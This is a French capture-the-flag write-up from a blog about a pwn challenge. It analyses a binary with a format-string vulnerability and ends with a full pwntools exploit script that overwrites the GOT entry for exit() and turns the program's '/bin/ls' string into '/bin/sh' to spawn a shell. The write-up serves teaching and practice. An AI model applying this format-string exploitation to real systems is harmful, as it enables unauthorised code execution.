# Chiffrement de Beaufort -  HSR 2024

## Binary Analysis
Pour analyser le binaire, on va commencer par l&#39;ouvrir avec un décompilo, comme **Binja**. Le binaire n&#39;étant pas strippé, on peut s&#39;aider des symboles pour deviner ce que fait chaque fonction.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_symbols.png)

A part la fonction *backdoor()* qui aspire à servir de fonction *win()*, le nom des fonctions ne nous apporte rien d&#39;intéressant.
Regardons un peu plus en détail ce que fait le programme.

### Main()
Tout d&#39;abord, la fonction *main()* va lire l&#39;entrée standard à 2 reprises, attendant de l&#39;utilisateur qu&#39;il envoie une chaine de maximum 0x64 caractères. Ensuite elle va stocker ces entrées dans 2 buffers, puis appeler la fonction *beaufortCipher()* avec ces 2 buffers en paramètres.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_main1.png)

### beaufortCipher()
Quant à la fonction *cipherBeaufort()*, comme son nom l&#39;indique, elle applique un chiffrement de **Beaufort** sur notre première input. La clé utilisée pour chiffrer le buffer est enfait notre 2ème input.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_cipher.png)

### End of main()
Une fois que notre input a été chiffrée avec la clé qu&#39;on donne au programme, la fonction *main()* affiche le buffer chiffré, puis la clé qu&#39;on lui a donné.
Et c&#39;est ici que se trouve la vuln. 

En effet, le *printf()* que le programme appel pour afficher notre clé prend directement la clé comme premier argument. Ainsi notre input (la clé) est interpetée, par *printf()*, comme étant le formatteur.
Le programme est donc vulnérable à une format string.

![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_main2.png)

## Theorycraft
Maintenant réfléchissons à comment on va exploiter la vuln. Si on fait un **checksec**, on remarque que le binaire n&#39;a ni **PIE**, ni **RelRO**.
```sh title:checksec
Canary  :    ✘ 
NX      :    ✓ 
PIE     :    ✘ 
Fortify :    ✘ 
RelRO   :    Partial
```

Dans tous les cas on part du principe que **l&#39;ASLR** est actif. De plus, comme le chall est en remote, on a pas les détails de l&#39;environnement dans lequel run le binaire, donc c&#39;est trop foireux de se baser sur des adresses hardcodées de la stack.

Par contre, l&#39;abscence de **RelRO** et de **PIE** nous permet non seulement de localiser la **GOT** à coup sûr, mais aussi d&#39;y accéder en écriture. On peut donc envisager d&#39;overwrite certaines entrées de la GOT afin d&#39;obtenir notre shell.

Enfin on a une fonction *backdoor()* qui lance un *system(&#34;/bin/ls&#34;)*. La string *&#34;/bin/ls&#34;* étant dans la section *.data*, on peut la changer pour *&#34;/bin/sh&#34;* avant de rediriger le flow d&#39;execution vers *backdoor()*.
## Exploitation
Notre exploit va se faire en 3 étapes:
1) Trouver à quel offset notre input se trouve sur la stack, au moment du call à *printf()*
2) Overwrite *&#34;/bin/ls&#34;* avec *&#34;/bin/sh&#34;*
3) Overwrite l&#39;entrée de *exit()* dans la **GOT** avec l&#39;adresse de *backup()*

### Input offset
Pour trouver l&#39;offset, tout ce qu&#39;on a à faire est de lancer le programme, **break** au moment du *printf()* vulnérable et regarder à quelle distance de **$ESP** se trouve notre input. Pour repérer facilement notre input, on va envoyer *&#34;aaaaaaa...&#34;* comme clé.
![Malloc from Top Chunk](/MyLittlePwney/images/beaufort_gdb.png)

On voit que notre input est à $0$x$78$ bytes de **$ESP**, soit en 32 bits, $30*4$ bytes. Notre offset est donc 30.

### The Exploit
Pour ce qui est de l&#39;exploit, on va utiliser le module *fmtstr* de *Pwntools* et plus particulièrement la fonction *fmtstr_payload()*. Il nous suffit simplement de lui passer comme argument l&#39;offset de notre input ainsi qu&#39;un dictionnaire des adresses et des valeurs qu&#39;on souhaite écrire.

```py
payload = fmtstr_payload(30, writes) 
print(payload)
```

L&#39;adresse de *&#34;/bin/ls&#34;* est *0x0804c024*. On va donc écrire *&#34;sh&#34;* à *0x0804c029*, ce qui nous donnera *&#34;/bin/sh&#34;*.
Enfin on va réécrire l&#39;entrée de *exit()* dans la **GOT** par l&#39;adresse de la fonction *backup()*.

```py
writes = { 0x0804c029: 0x00006873, 
		   elfexe.got[&#39;exit&#39;]: elfexe.sym[&#39;backdoor&#39;]}
```

Ce qui donne comme exploit final :
```py title:exploit.py
#!/usr/bin/python3.9 
from pwn import * 

context.binary = elfexe = ELF(&#39;./beaufort.bin&#39;)

def start(argv=[], *a, **kw): 
	&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39; 
	elf_path = elfexe.path 
	
	if args.REMOTE: 
		remote_server = &#39;10.22.148.11&#39;
		remote_port = 1341
		target = remote(remote_server, remote_port) 
	else:  
		target = process([elf_path] &#43; argv, *a, **kw) 
	
	return target 
		
#=========================================================== 
# EXPLOIT GOES HERE 
#=========================================================== 
def pad(payload): 
	return payload&#43;b&#39;_&#39;*(0x64-len(payload)) 
	
arguments = [] 
io = start(arguments) 

writes = {0x0804c029: 0x00006873, 
		  elfexe.got[&#39;exit&#39;]: elfexe.sym[&#39;backdoor&#39;]} 

payload = b&#34;A&#34;*0x60 
io.sendline(payload) 

payload = fmtstr_payload(30, writes) 
payload = pad(payload) 

print(payload) 
io.sendline(payload) 

io.interactive()
io.close()
```


---

> Author:   
> URL: https://0xeg0.github.io/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/  

